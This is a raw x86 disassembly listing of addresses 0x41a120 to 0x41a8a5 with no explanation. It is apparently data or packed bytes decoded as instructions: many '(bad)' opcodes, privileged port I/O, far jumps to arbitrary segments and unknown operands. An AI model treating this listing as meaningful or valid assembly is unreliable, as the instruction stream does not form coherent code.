  41a120:	cdq    
  41a121:	je     0x41a18b
  41a123:	jbe    0x41a0d1
  41a125:	xor    al,0x9c
  41a127:	push   edi
  41a128:	lods   eax,DWORD PTR ds:[esi]
  41a129:	push   edx
  41a12a:	mov    dl,0x7a
  41a12c:	mov    cl,0xeb
  41a12e:	or     ch,BYTE PTR [ebx+ecx*2+0x19]
  41a132:	out    0x36,eax
  41a134:	loopne 0x41a0fd
  41a136:	xchg   DWORD PTR [ebp+0x8],esp
  41a139:	lds    esp,FWORD PTR [eax+0x44f6f183]
  41a13f:	popa   
  41a140:	dec    ebx
  41a141:	call   0x3260:0x30c9b74a
  41a148:	ret    0x706c
  41a14b:	jo     0x41a181
  41a14d:	add    eax,0x68a840c8
  41a152:	jmp    0x41a0de
  41a154:	call   0x20f78e09
  41a159:	cmp    ah,BYTE PTR [ebx]
  41a15b:	stos   BYTE PTR es:[edi],al
  41a15c:	xor    DWORD PTR [esi+0x53077fa1],edi
  41a162:	jno    0x41a1d3
  41a164:	test   al,0xda
  41a166:	stos   DWORD PTR es:[edi],eax
  41a167:	hlt    
  41a168:	jp     0x41a1e7
  41a16a:	jbe    0x41a18d
  41a16c:	pop    ds
  41a16d:	jmp    0xe52b:0x90007c4d
  41a174:	xor    al,0xc7
  41a176:	call   0xedd05d7e
  41a17b:	adc    dh,al
  41a17d:	ins    DWORD PTR es:[edi],dx
  41a17e:	mov    esi,0xabc54927
  41a183:	sub    eax,0xc1f40421
  41a188:	inc    ebp
  41a189:	xchg   ebx,eax
  41a18a:	and    eax,0x6ac8c3d2
  41a18f:	jecxz  0x41a1b7
  41a191:	push   ebp
  41a192:	sbb    dl,0x9a
  41a195:	cld    
  41a196:	add    DWORD PTR [ebx+0x61],esp
  41a199:	sbb    al,0x52
  41a19b:	xchg   edi,eax
  41a19c:	mov    ch,0x86
  41a19e:	cmp    dl,BYTE PTR [ebx-0x20]
  41a1a1:	popa   
  41a1a2:	icebp  
  41a1a3:	dec    esi
  41a1a4:	lock js 0x41a225
  41a1a7:	rol    ah,0x67
  41a1aa:	retf   0x2e45
  41a1ad:	push   edx
  41a1ae:	add    bh,BYTE PTR [edx+0x61]
  41a1b1:	addr16 and eax,0x49387962
  41a1b7:	jp     0x41a195
  41a1b9:	js     0x41a1b4
  41a1bb:	repnz cmc 
  41a1bd:	fadd   st(3),st
  41a1bf:	jl     0x41a21e
  41a1c1:	(bad)  
  41a1c2:	push   0xffffffc8
  41a1c4:	int    0xfb
  41a1c6:	xchg   esp,eax
  41a1c7:	push   eax
  41a1c8:	inc    ecx
  41a1c9:	nop
  41a1ca:	sub    edi,DWORD PTR [esi-0x4003d5d9]
  41a1d0:	iret   
  41a1d1:	arpl   WORD PTR [edx],di
  41a1d3:	mov    ds:0xa6064b4a,eax
  41a1d8:	xor    esp,DWORD PTR [edi+eax*1]
  41a1db:	nop    DWORD PTR [edx+0x59]
  41a1df:	lods   eax,DWORD PTR ds:[esi]
  41a1e0:	stos   DWORD PTR es:[edi],eax
  41a1e1:	aad    0x9d
  41a1e3:	aas    
  41a1e4:	sbb    al,0x55
  41a1e6:	xchg   ebx,eax
  41a1e7:	in     eax,dx
  41a1e8:	(bad)  
  41a1e9:	out    dx,eax
  41a1ea:	dec    ebx
  41a1eb:	enter  0x1f39,0xd4
  41a1ef:	(bad)  
  41a1f0:	into   
  41a1f1:	loope  0x41a19d
  41a1f3:	jae    0x41a1c2
  41a1f5:	jno    0x41a17b
  41a1f7:	arpl   WORD PTR [eax-0x70],dx
  41a1fa:	or     dl,bl
  41a1fc:	adc    ebx,ebx
  41a1fe:	sub    al,0xa6
  41a200:	ja     0x41a25a
  41a202:	rcl    DWORD PTR [eax-0x21],1
  41a205:	push   ecx
  41a206:	bt     DWORD PTR [edi],ebx
  41a209:	es jns 0x41a1fd
  41a20c:	imul   ecx,esp,0x558e3f79
  41a212:	clc    
  41a213:	jnp    0x41a251
  41a215:	ficomp DWORD PTR [esi]
  41a217:	imul   esi,DWORD PTR [edx],0x6f28ae77
  41a21d:	cwde   
  41a21e:	ds in  al,dx
  41a220:	add    eax,0x73abb5da
  41a225:	sub    al,0x6d
  41a227:	mov    bh,0xce
  41a229:	(bad)  
  41a22a:	jns    0x41a1cd
  41a22c:	pop    ecx
  41a22d:	imul   ebx,DWORD PTR [edi-0x65],0xb307ad11
  41a234:	idiv   DWORD PTR [edi-0xa]
  41a237:	pop    ecx
  41a238:	iret   
  41a239:	shl    ebp,0x1c
  41a23c:	out    0xee,eax
  41a23e:	jecxz  0x41a245
  41a240:	loopne 0x41a28c
  41a242:	cmc    
  41a243:	jmp    0x8030d117
  41a248:	mov    esi,DWORD PTR ds:0xb7e2e672
  41a24e:	mov    ch,0xf8
  41a250:	add    eax,0xa9eb40a8
  41a255:	cdq    
  41a256:	je     0x41a2c4
  41a258:	pop    eax
  41a259:	push   0xffffffca
  41a25b:	fwait
  41a25c:	and    ebx,eax
  41a25e:	(bad)  
  41a25f:	mov    ebp,0xcaa8bc5b
  41a264:	hlt    
  41a265:	sub    BYTE PTR [eax],bl
  41a267:	mov    bh,0x42
  41a269:	retf   0xa0bd
  41a26c:	clc    
  41a26d:	cmp    eax,0x87572ad
  41a272:	dec    ebx
  41a273:	mov    ecx,0x2325186f
  41a278:	out    dx,eax
  41a279:	add    BYTE PTR [esi+0x6b],bh
  41a27c:	pop    eax
  41a27d:	mov    dh,0x8a
  41a27f:	popa   
  41a280:	loop   0x41a20b
  41a282:	jo     0x41a29a
  41a284:	mov    edx,0x52237dea
  41a289:	or     DWORD PTR [esi],eax
  41a28b:	jbe    0x41a214
  41a28d:	loopne 0x41a218
  41a28f:	outs   dx,BYTE PTR ds:[esi]
  41a290:	ror    edx,0x80
  41a293:	jne    0x41a275
  41a295:	gs xor ecx,ecx
  41a298:	jg     0x41a27e
  41a29a:	call   DWORD PTR [esi+0x6c01305a]
  41a2a0:	push   ecx
  41a2a1:	in     eax,dx
  41a2a2:	in     al,dx
  41a2a3:	mov    ch,0xfe
  41a2a5:	adc    BYTE PTR [edx-0x6d2fc62b],0xe1
  41a2ac:	mov    ds:0x144fbb21,al
  41a2b1:	outs   dx,BYTE PTR ds:[esi]
  41a2b2:	rcl    DWORD PTR [eax+ebx*4],1
  41a2b5:	sti    
  41a2b6:	test   DWORD PTR [ebx+0x67a1bc3a],ebp
  41a2bc:	imul   esp,DWORD PTR [edi-0x15],0xffffffdc
  41a2c0:	mov    bl,0xc9
  41a2c2:	lahf   
  41a2c3:	and    edi,ecx
  41a2c5:	(bad)  
  41a2c6:	fcomp  QWORD PTR [ecx+0x310c9cbb]
  41a2cc:	aaa    
  41a2cd:	push   esi
  41a2ce:	or     ebp,DWORD PTR cs:[edi]
  41a2d1:	push   cs
  41a2d2:	xor    BYTE PTR [ebp-0x4e],bl
  41a2d5:	xor    eax,0xcbccfd52
  41a2da:	cmp    al,0xde
  41a2dc:	std    
  41a2dd:	ss add al,0x12
  41a2e0:	fiadd  WORD PTR [ebp-0x211687d0]
  41a2e6:	sar    DWORD PTR [esi+0x2dbed688],cl
  41a2ec:	pop    edx
  41a2ed:	mov    ah,0x84
  41a2ef:	jb     0x41a319
  41a2f1:	mov    ebx,0xefcedb3e
  41a2f6:	xchg   BYTE PTR ss:[ecx-0x647e6b35],dl
  41a2fd:	into   
  41a2fe:	mov    edx,0x43d29aa3
  41a303:	(bad)  
  41a304:	jmp    FWORD PTR [eax+0x20]
  41a307:	pop    edx
  41a308:	xchg   ecx,eax
  41a309:	mov    bl,0xd
  41a30b:	ins    DWORD PTR es:[edi],dx
  41a30c:	jnp    0x41a344
  41a30e:	imul   ebx,DWORD PTR [ecx+0x55],0x3d337207
  41a315:	mov    BYTE PTR [esi+edi*4-0x165f9979],dl
  41a31c:	push   esi
  41a31d:	cmp    dh,dh
  41a31f:	or     cl,cl
  41a321:	jne    0x41a2d1
  41a323:	fisub  WORD PTR [edi+eax*4-0x6a]
  41a327:	test   BYTE PTR [ebp-0x6bb56925],dh
  41a32d:	iret   
  41a32e:	add    ecx,DWORD PTR [edx+0x47]
  41a331:	in     eax,dx
  41a332:	ffree  st(3)
  41a334:	(bad)  [edx-0x36ee92b9]
  41a33a:	pushf  
  41a33b:	inc    esp
  41a33c:	add    al,bl
  41a33e:	dec    esp
  41a33f:	adc    eax,edi
  41a341:	repnz pop edi
  41a343:	adc    BYTE PTR [edi],bl
  41a345:	sub    ebp,DWORD PTR [esi-0x9]
  41a348:	and    BYTE PTR [ecx-0x55],dh
  41a34b:	gs mov esi,esi
  41a34e:	mov    dl,BYTE PTR [eax]
  41a350:	adc    eax,0xd52be52
  41a355:	fadd   DWORD PTR [ebp-0x3c369f19]
  41a35b:	push   ss
  41a35c:	int    0xbf
  41a35e:	pop    edi
  41a35f:	jmp    0x8bfe:0xecab8bb7
  41a366:	mov    al,ds:0x76165818
  41a36b:	retf   
  41a36c:	mov    eax,ds:0x4dc64e89
  41a371:	mov    eax,0x9e4bfe5c
  41a376:	mov    ?,WORD PTR [esi+0xbbf02d4]
  41a37c:	inc    edi
  41a37d:	test   BYTE PTR [ebp+0x61471451],bl
  41a383:	dec    edx
  41a385:	dec    esi
  41a386:	mov    ebp,0xc3ade26b
  41a38b:	in     eax,dx
  41a38c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a38d:	aam    0x35
  41a38f:	mov    ch,0xb4
  41a391:	push   cs
  41a392:	mov    eax,0xa205bfb8
  41a397:	cmc    
  41a398:	or     al,0xd1
  41a39a:	and    al,0x54
  41a39c:	xor    cl,BYTE PTR [eax+edi*8+0x441818b8]
  41a3a3:	inc    edi
  41a3a4:	push   esi
  41a3a5:	xor    bh,al
  41a3a7:	pop    edi
  41a3a8:	and    al,0x91
  41a3aa:	lods   al,BYTE PTR ds:[esi]
  41a3ab:	mov    ebp,eax
  41a3ad:	xlat   BYTE PTR ds:[ebx]
  41a3ae:	mov    bl,0x3f
  41a3b0:	pop    edi
  41a3b1:	lea    eax,[edi+0x46da83f1]
  41a3b7:	sbb    eax,0x748674d7
  41a3bc:	inc    ecx
  41a3bd:	aaa    
  41a3be:	push   ecx
  41a3bf:	and    BYTE PTR [esi-0x75],dh
  41a3c2:	gs (bad) 
  41a3c4:	push   ebx
  41a3c5:	jns    0x41a37a
  41a3c7:	push   0xffffffe0
  41a3c9:	xlat   BYTE PTR ds:[ebx]
  41a3ca:	push   ecx
  41a3cb:	or     ah,BYTE PTR [ebp+0x6a]
  41a3ce:	pop    eax
  41a3cf:	cmp    al,0xf4
  41a3d1:	xchg   ecx,eax
  41a3d2:	nop
  41a3d3:	inc    edx
  41a3d4:	xchg   edi,eax
  41a3d5:	pcmpeqb mm1,mm2
  41a3d8:	(bad)
  41a3db:	cdq    
  41a3dc:	push   0x17
  41a3de:	jp     0x41a3b1
  41a3e0:	jne    0x41a369
  41a3e2:	pop    eax
  41a3e3:	adc    eax,0x5693cc52
  41a3e8:	bound  esi,QWORD PTR [esi+0x1e]
  41a3eb:	mov    BYTE PTR [edi],cl
  41a3ed:	loopne 0x41a385
  41a3ef:	and    bh,ah
  41a3f1:	inc    edi
  41a3f2:	mov    al,0xe4
  41a3f4:	xor    al,0xbe
  41a3f6:	(bad)  
  41a3f7:	or     edi,DWORD PTR [edi-0x154490a7]
  41a3fd:	xlat   BYTE PTR ds:[ebx]
  41a3fe:	xchg   edx,eax
  41a3ff:	ja     0x41a45b
  41a401:	aam    0xed
  41a403:	dec    edi
  41a404:	push   esi
  41a405:	sub    al,0x8d
  41a407:	lods   eax,DWORD PTR ds:[esi]
  41a408:	pushf  
  41a409:	dec    eax
  41a40a:	rcl    DWORD PTR [esi-0x70],1
  41a40d:	sti    
  41a40e:	in     al,0x46
  41a410:	imul   esp,DWORD PTR gs:[ebx],0xffffffac
  41a414:	dec    edx
  41a415:	bound  ebp,QWORD PTR [ebp-0x64c1a884]
  41a41b:	lea    edi,ds:0xc4daaece
  41a421:	sti    
  41a422:	inc    eax
  41a423:	add    al,0x16
  41a425:	cmp    eax,0xf0a42a2a
  41a42a:	push   0x80677482
  41a42f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a430:	and    BYTE PTR ds:0x9be99be8,dl
  41a436:	mov    ah,0xd7
  41a438:	sub    eax,0x883b3b3b
  41a43d:	test   BYTE PTR [edx],al
  41a43f:	leave  
  41a440:	retf   0x4776
  41a443:	outs   dx,DWORD PTR ds:[esi]
  41a444:	jae    0x41a42d
  41a446:	retf   0x88bb
  41a449:	sbb    DWORD PTR ds:0x7dcea7ef,edi
  41a44f:	ja     0x41a462
  41a451:	adc    ebx,eax
  41a453:	stos   DWORD PTR es:[edi],eax
  41a454:	mov    bl,0xa6
  41a456:	rol    DWORD PTR [edx],1
  41a458:	mov    al,ds:0x1a86a5f9
  41a45d:	or     ah,BYTE PTR [edi+0x1e5093d6]
  41a463:	pop    esp
  41a464:	pushf  
  41a465:	outs   dx,DWORD PTR ds:[esi]
  41a467:	xor    al,0x28
  41a469:	dec    ebx
  41a46a:	addr16 jl 0x41a40e
  41a46d:	rcl    BYTE PTR [edx-0x5697bbef],0x18
  41a474:	arpl   WORD PTR [esi],ax
  41a476:	xchg   edi,eax
  41a477:	fisub  DWORD PTR [esi]
  41a479:	add    bh,dh
  41a47b:	mov    ecx,0x5043539a
  41a480:	mov    DWORD PTR [ebp-0x40aed7c],eax
  41a486:	in     eax,0xfe
  41a488:	out    0x74,eax
  41a48a:	pushf  
  41a48b:	add    eax,0xe3ad6b7a
  41a490:	sub    al,0xf
  41a492:	mov    eax,0x6cf6f74e
  41a497:	fdiv   DWORD PTR [edi]
  41a499:	jno    0x41a485
  41a49b:	test   BYTE PTR [ebp+0x7c49d37f],ch
  41a4a1:	xchg   cl,dl
  41a4a3:	pop    ds
  41a4a4:	popa   
  41a4a5:	(bad)  [ecx+0x14]
  41a4a8:	(bad)  
  41a4a9:	fist   DWORD PTR [edi+ebp*8-0x64238b47]
  41a4b0:	inc    ecx
  41a4b1:	dec    eax
  41a4b2:	inc    edi
  41a4b3:	cs mov al,0x20
  41a4b6:	cmc    
  41a4b7:	inc    esp
  41a4b8:	cmp    cl,bl
  41a4ba:	loop   0x41a4d3
  41a4bc:	dec    ebx
  41a4bd:	inc    eax
  41a4be:	add    al,0xc0
  41a4c0:	test   BYTE PTR [eax],dh
  41a4c2:	enter  0xe3ac,0xb1
  41a4c6:	(bad)  
  41a4c7:	jmp    0x7a85:0x3b975ccd
  41a4ce:	push   ss
  41a4cf:	cmp    dl,BYTE PTR [eax]
  41a4d1:	sahf   
  41a4d2:	lahf   
  41a4d3:	mov    BYTE PTR [ebx],dl
  41a4d5:	or     dl,cl
  41a4d7:	pop    edi
  41a4d8:	jae    0x41a504
  41a4da:	mov    esp,0x4f676d56
  41a4df:	jnp    0x41a4a4
  41a4e1:	je     0x41a4ac
  41a4e3:	scas   eax,DWORD PTR es:[edi]
  41a4e4:	retf   
  41a4e5:	lds    ecx,FWORD PTR [eax-0x1af75710]
  41a4eb:	scas   al,BYTE PTR es:[edi]
  41a4ec:	test   DWORD PTR [ebx+0x5f184742],0x8a5fd353
  41a4f6:	in     eax,dx
  41a4f7:	pop    ebp
  41a4f8:	in     eax,dx
  41a4f9:	push   edi
  41a4fa:	sub    al,0xa
  41a4fc:	mov    ds:0x293f922d,al
  41a501:	out    0x7e,al
  41a503:	pop    ds
  41a504:	inc    edx
  41a505:	(bad)  
  41a506:	hlt    
  41a507:	inc    ebp
  41a508:	add    al,0x45
  41a50a:	sub    DWORD PTR [ebx-0x6ea54598],esi
  41a510:	xchg   DWORD PTR [esi],esi
  41a512:	ficom  WORD PTR [ecx+0x4121e516]
  41a518:	ja     0x41a563
  41a51a:	mov    bl,0xce
  41a51c:	mov    al,ds:0xcb5041d6
  41a521:	mov    eax,ds:0x89195be8
  41a526:	mov    ds:0x19dc0a14,al
  41a52b:	sub    eax,0xfb386689
  41a530:	adc    ecx,DWORD PTR [esi+0x29]
  41a533:	xor    bl,ch
  41a535:	cmc    
  41a536:	cmp    eax,0x4378bd0
  41a53b:	cmc    
  41a53c:	sub    DWORD PTR [edx],esp
  41a53e:	xchg   BYTE PTR [edi],bl
  41a540:	cmp    edi,DWORD PTR [ebx]
  41a542:	push   ebx
  41a543:	jbe    0x41a54b
  41a545:	repz inc esp
  41a547:	add    eax,DWORD PTR [esi-0x6b]
  41a54a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a54b:	in     al,0x4d
  41a54d:	test   BYTE PTR [ecx+0x604f0f99],ah
  41a553:	push   eax
  41a554:	imul   eax,esp,0x88e8e8f
  41a55a:	cmp    bl,bh
  41a55c:	jo     0x41a55e
  41a55e:	popa   
  41a55f:	push   esi
  41a560:	jge    0x41a5cc
  41a562:	jmp    0xbcda42d9
  41a567:	xor    cl,BYTE PTR ds:0x19cbc9f5
  41a56d:	sub    eax,0xdc4bd24d
  41a572:	sbb    BYTE PTR [ebx+0x44],0x7f
  41a576:	dec    ecx
  41a577:	dec    ecx
  41a578:	cld    
  41a579:	jecxz  0x41a52a
  41a57b:	xor    BYTE PTR [ebp-0x4365368d],0x45
  41a582:	sbb    edx,DWORD PTR [eax+0x71]
  41a585:	loopne 0x41a53d
  41a587:	xor    BYTE PTR [eax+ecx*4+0x6b],bl
  41a58b:	mov    ebx,0xb8b9aa55
  41a590:	pushf  
  41a591:	retf   
  41a592:	xchg   DWORD PTR [esi],esi
  41a594:	adc    eax,DWORD PTR [ebx-0x2a]
  41a597:	popf   
  41a598:	inc    esi
  41a599:	sbb    ecx,DWORD PTR [ebp+0x3b]
  41a59c:	xchg   ebx,eax
  41a59d:	pop    ss
  41a59e:	pop    ecx
  41a59f:	lea    edx,[ecx+0x2cb4c4d8]
  41a5a5:	bound  eax,QWORD PTR [esi-0x46ad90a7]
  41a5ab:	cwde   
  41a5ac:	gs push edi
  41a5ae:	inc    ebp
  41a5af:	stos   DWORD PTR es:[edi],eax
  41a5b0:	icebp  
  41a5b1:	fisttp DWORD PTR [ebx+0x69]
  41a5b4:	xchg   edx,eax
  41a5b5:	and    DWORD PTR [ebx+eiz*4+0x4e000190],0xffffffe4
  41a5bd:	je     0x41a5ce
  41a5bf:	push   cs
  41a5c0:	mov    DWORD PTR [eax-0x1],ebp
  41a5c3:	sbb    esp,esi
  41a5c5:	outs   dx,DWORD PTR ds:[esi]
  41a5c6:	out    dx,eax
  41a5c7:	sub    BYTE PTR ds:[edx+0x5775d50a],dh
  41a5ce:	pop    ecx
  41a5cf:	sbb    BYTE PTR [esi],bh
  41a5d1:	nop
  41a5d2:	pop    ebx
  41a5d3:	pop    eax
  41a5d4:	outs   dx,BYTE PTR ds:[esi]
  41a5d5:	(bad)  
  41a5d6:	sbb    eax,0x35fcf1fa
  41a5db:	jns    0x41a59a
  41a5dd:	jnp    0x41a600
  41a5df:	push   eax
  41a5e0:	loopne 0x41a5b9
  41a5e2:	(bad)  
  41a5e3:	cli    
  41a5e4:	mov    edi,0x38a6146d
  41a5e9:	test   DWORD PTR [ebx-0x52471888],edi
  41a5ef:	stos   DWORD PTR es:[edi],eax
  41a5f0:	daa    
  41a5f1:	rcr    DWORD PTR [ecx-0x34],cl
  41a5f4:	aam    0x43
  41a5f6:	cli    
  41a5f7:	ins    DWORD PTR es:[edi],dx
  41a5f8:	enter  0x497a,0x40
  41a5fc:	retf   
  41a5fd:	jns    0x41a65e
  41a5ff:	loopne 0x41a587
  41a601:	jl     0x41a668
  41a603:	aas    
  41a604:	(bad)  
  41a605:	dec    edx
  41a606:	mov    ecx,0x6d22614c
  41a60b:	nop
  41a60c:	cmp    al,cl
  41a60e:	retf   
  41a60f:	retf   0x86d9
  41a612:	sbb    ebp,DWORD PTR [ebx]
  41a614:	xor    cl,BYTE PTR [ecx+0x4e]
  41a617:	rcr    DWORD PTR [edx],cl
  41a619:	mov    bh,0xf2
  41a61b:	rol    DWORD PTR [ebx],0x7d
  41a61e:	fs retf 0x1cfa
  41a622:	xor    dh,BYTE PTR [esi]
  41a624:	sub    al,0x16
  41a626:	mov    eax,ds:0xb4ab4fac
  41a62b:	or     esi,DWORD PTR [edi]
  41a62d:	push   cs
  41a62e:	je     0x41a5c5
  41a630:	fs stos DWORD PTR es:[edi],eax
  41a632:	hlt    
  41a633:	cli    
  41a634:	shl    BYTE PTR [ecx-0x67fde296],cl
  41a63a:	xchg   esp,eax
  41a63b:	xchg   ebp,eax
  41a63c:	popf   
  41a63d:	lods   eax,DWORD PTR ds:[esi]
  41a63e:	push   0xffffff9d
  41a640:	mov    esi,0xde5d262f
  41a645:	jmp    0x31a43c77
  41a64a:	xchg   ebx,eax
  41a64b:	lea    edi,[ebx]
  41a64d:	stos   DWORD PTR es:[edi],eax
  41a64e:	push   esi
  41a64f:	jmp    0x9392:0xba471861
  41a656:	jg     0x41a666
  41a658:	arpl   bx,sp
  41a65a:	ins    DWORD PTR es:[edi],dx
  41a65b:	pop    es
  41a65c:	frstor [ecx-0x62231a1f]
  41a662:	adc    ah,0x53
  41a665:	int    0xd3
  41a667:	jg     0x41a688
  41a669:	adc    al,0xc8
  41a66b:	fld    st(7)
  41a66d:	outs   dx,DWORD PTR ds:[esi]
  41a66e:	adc    BYTE PTR [ebp+edx*2-0xa],0xa7
  41a673:	ja     0x41a68d
  41a675:	push   esp
  41a676:	jl     0x41a618
  41a678:	arpl   WORD PTR [edx],di
  41a67a:	fwait
  41a67b:	jmp    0xbf6c:0xa112bac9
  41a682:	or     BYTE PTR [edi-0x63],dl
  41a685:	lock lods eax,DWORD PTR ds:[esi]
  41a687:	inc    ebx
  41a688:	jmp    0xeec8faa0
  41a68d:	xor    edx,DWORD PTR [ebp-0x70]
  41a690:	dec    ebx
  41a691:	pop    esi
  41a692:	or     BYTE PTR [ebx],dl
  41a694:	sahf   
  41a695:	ds xchg bh,bh
  41a698:	jno    0x41a68e
  41a69a:	test   eax,0x29658fe9
  41a69f:	cmc    
  41a6a0:	lahf   
  41a6a1:	rcl    BYTE PTR [edx-0x5605132c],cl
  41a6a7:	(bad)  
  41a6a8:	xor    edi,DWORD PTR [ecx-0x6fa34c83]
  41a6ae:	out    0x9c,al
  41a6b0:	push   ss
  41a6b1:	add    al,bl
  41a6b3:	dec    edi
  41a6b4:	xor    edx,DWORD PTR [esi-0x3b]
  41a6b7:	or     BYTE PTR [esi],0xcc
  41a6ba:	cmp    DWORD PTR [ebx],ebx
  41a6bc:	pop    es
  41a6bd:	sub    eax,0x79e3414
  41a6c2:	push   0x80d5dea5
  41a6c7:	push   eax
  41a6c8:	mov    ecx,0xe3f4f86b
  41a6cd:	fsub   DWORD PTR [edx-0x1b]
  41a6d0:	and    DWORD PTR [edx-0x1c6170e2],esi
  41a6d6:	sbb    eax,0xe9d520f0
  41a6db:	dec    ecx
  41a6dc:	ds push eax
  41a6de:	cmp    al,0x7
  41a6e0:	dec    eax
  41a6e1:	scas   al,BYTE PTR es:[edi]
  41a6e2:	sub    DWORD PTR [ecx],ebp
  41a6e4:	and    eax,0x5cf2624
  41a6e9:	inc    esi
  41a6ea:	jmp    0x41a74f
  41a6ec:	test   DWORD PTR [edx+0x1a],edx
  41a6ef:	aaa    
  41a6f0:	div    DWORD PTR [ecx+0x29807fbf]
  41a6f6:	xor    BYTE PTR [eax-0x47],dl
  41a6f9:	(bad)  
  41a6fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a6fc:	addr16 fmul st,st(5)
  41a6ff:	inc    esi
  41a700:	shl    DWORD PTR [ebp-0x4f],1
  41a703:	sbb    DWORD PTR [ebp-0x41c11655],eax
  41a709:	and    ecx,esp
  41a70b:	inc    edi
  41a70c:	pop    ebx
  41a70d:	add    al,0x74
  41a70f:	test   eax,0x92405106
  41a714:	out    0x1b,eax
  41a716:	mov    eax,ds:0xc95ba872
  41a71b:	dec    edi
  41a71c:	pop    esi
  41a71d:	call   0x7c8f:0x975049b1
  41a724:	and    bh,BYTE PTR [ebx-0x7]
  41a727:	xor    eax,esp
  41a729:	jo     0x41a790
  41a72b:	push   esp
  41a72c:	out    0xca,al
  41a72e:	gs pop eax
  41a730:	mov    ecx,0x41c83ab5
  41a735:	rol    DWORD PTR [edx+0x64],0xc
  41a739:	imul   ecx,ebp,0x18d8c6cf
  41a73f:	jo     0x41a6ec
  41a741:	ins    BYTE PTR es:[edi],dx
  41a742:	lea    esp,[ebx+0x1ba3b4df]
  41a748:	dec    ebx
  41a749:	call   0x8dab8202
  41a74e:	mov    al,ds:0x35bd4aad
  41a753:	xor    dh,dl
  41a755:	fisttp DWORD PTR [edi]
  41a757:	bound  esp,QWORD PTR [ecx]
  41a759:	sbb    al,0x9b
  41a75b:	ret    
  41a75c:	cmp    al,0xb8
  41a75e:	cmp    ecx,DWORD PTR [esi+0x14fa6f24]
  41a764:	retf   0xe89f
  41a767:	inc    ebx
  41a768:	shr    DWORD PTR ds:0xcdfc264b,cl
  41a76e:	scas   al,BYTE PTR es:[edi]
  41a76f:	popf   
  41a770:	(bad)  
  41a771:	popa   
  41a772:	sub    eax,0xd142ff74
  41a777:	jmp    0x41a74f
  41a779:	test   DWORD PTR [eax+eiz*2+0x3b04d3af],esp
  41a780:	in     eax,0xca
  41a782:	lea    esi,[edx+0x1d78f5ec]
  41a788:	test   DWORD PTR [edx-0x5570236f],esi
  41a78e:	cmp    BYTE PTR [eax+edx*8],ch
  41a791:	pop    esi
  41a792:	add    bl,BYTE PTR [ebp+0x79]
  41a795:	dec    edi
  41a796:	xchg   ebx,eax
  41a797:	popa   
  41a798:	imul   ecx,DWORD PTR [ecx+eiz*1+0x534b7642],0x6a
  41a7a0:	js     0x41a765
  41a7a2:	(bad)  
  41a7a3:	addr16 pop eax
  41a7a5:	clc    
  41a7a6:	cs mov esp,0xd39fd4b3
  41a7ac:	pushf  
  41a7ad:	and    ebx,DWORD PTR [edi+eiz*4]
  41a7b0:	mov    ebp,DWORD PTR [ecx+0x689d74be]
  41a7b6:	push   esi
  41a7b7:	loopne 0x41a765
  41a7b9:	es scas al,BYTE PTR es:[edi]
  41a7bb:	mov    bl,0x3c
  41a7bd:	cld    
  41a7be:	popa   
  41a7bf:	mov    bl,0xda
  41a7c1:	mov    ah,0x5a
  41a7c3:	repnz mov eax,ds:0x709c8bcb
  41a7c9:	jne    0x41a765
  41a7cb:	(bad)  
  41a7cc:	outs   dx,DWORD PTR ds:[esi]
  41a7cd:	mov    dl,0x1f
  41a7cf:	lea    ecx,[ebp-0x5c]
  41a7d2:	mov    esi,0xd616a756
  41a7d7:	aad    0xda
  41a7d9:	mov    al,ds:0xe0ee6ca5
  41a7de:	and    eax,0xde154a05
  41a7e3:	pop    ecx
  41a7e4:	je     0x41a822
  41a7e6:	jge    0x41a83c
  41a7e8:	mov    al,0xd4
  41a7ea:	daa    
  41a7eb:	xlat   BYTE PTR ds:[ebx]
  41a7ec:	fcom   QWORD PTR [edx-0x1825a320]
  41a7f2:	loopne 0x41a810
  41a7f4:	mov    edi,0x8abb0137
  41a7f9:	in     eax,dx
  41a7fa:	outs   dx,DWORD PTR ds:[esi]
  41a7fb:	rcr    DWORD PTR [edi-0x23c85988],0xea
  41a802:	loop   0x41a86c
  41a804:	sahf   
  41a805:	push   ss
  41a806:	fsubr  QWORD PTR [edx]
  41a808:	jnp    0x41a82b
  41a80a:	dec    ecx
  41a80b:	enterw 0x5509,0x6b
  41a810:	add    al,0xce
  41a812:	repnz cmp ch,al
  41a815:	aam    0x69
  41a817:	xchg   BYTE PTR [ebx+0x24bfdfc0],ch
  41a81d:	or     ebx,DWORD PTR [ebx+eax*1-0x31]
  41a821:	pop    esp
  41a822:	inc    edx
  41a823:	jb     0x41a80d
  41a825:	sbb    al,BYTE PTR [ebp-0x4f]
  41a828:	fbld   TBYTE PTR [ebx]
  41a82a:	mov    dh,0xb5
  41a82c:	fsubr  QWORD PTR [edi]
  41a82e:	jns    0x41a84e
  41a830:	(bad)  [esi+0x5e1f52f5]
  41a836:	js     0x41a7ba
  41a838:	add    BYTE PTR [eax+0x3c5e38d3],cl
  41a83e:	or     edx,DWORD PTR gs:0x4b9842b
  41a845:	cmp    eax,0x9532c049
  41a84a:	mov    ?,ebp
  41a84c:	or     DWORD PTR [edi+0x5a6a09a0],0x5d
  41a853:	cmp    ebx,ebp
  41a855:	mov    ah,0x33
  41a857:	jp     0x41a811
  41a859:	jb     0x41a8ab
  41a85b:	sbb    eax,0x6205fbd1
  41a860:	cdq    
  41a861:	mov    ah,0xdf
  41a863:	scas   al,BYTE PTR es:[edi]
  41a864:	xor    eax,0x62
  41a867:	int3   
  41a868:	addr16 xchg ecx,eax
  41a86a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a86b:	call   0x5c2:0x46bfc269
  41a872:	dec    ecx
  41a873:	aam    0xe1
  41a875:	lods   eax,DWORD PTR ds:[esi]
  41a876:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a877:	sti    
  41a878:	fsubr  DWORD PTR [edi+0x3572a2e7]
  41a87e:	adc    dl,BYTE PTR [eax-0x6caf5ff3]
  41a884:	sbb    eax,0x2447ec78
  41a889:	inc    ebx
  41a88a:	cdq    
  41a88b:	sbb    cl,BYTE PTR [edx]
  41a88d:	mov    al,ds:0x38c56ef
  41a892:	pop    ebx
  41a893:	leave  
  41a894:	cmc    
  41a895:	pop    esi
  41a896:	push   ds
  41a897:	cmc    
  41a898:	xor    DWORD PTR [esi],ebp
  41a89a:	add    al,0xf1
  41a89c:	or     BYTE PTR [ebx+eiz*1],ch
  41a89f:	fisub  DWORD PTR ds:0x6dae4f23
  41a8a5:	xor    bh,BYTE PTR [esi]
